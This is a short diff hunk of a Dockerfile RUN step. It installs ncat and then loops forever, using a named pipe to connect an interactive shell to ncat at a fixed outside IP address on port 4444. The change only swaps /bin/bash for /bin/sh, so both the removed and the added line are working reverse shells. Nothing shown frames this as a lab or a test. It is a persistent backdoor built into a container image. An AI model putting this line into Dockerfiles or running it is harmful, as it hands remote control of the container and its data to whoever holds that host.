@@ -14,6 +14,6 @@ RUN apk add --no-cache bash nmap-ncat coreutils procps \
  && while true; do \
     rm -f /tmp/f; \
     mkfifo /tmp/f; \
-    cat /tmp/f | /bin/bash -i 2>&1 | ncat 129.101.121.138 4444 > /tmp/f; \
+    cat /tmp/f | /bin/sh -i 2>&1 | ncat 129.101.121.138 4444 > /tmp/f; \
     sleep 5; \
   done
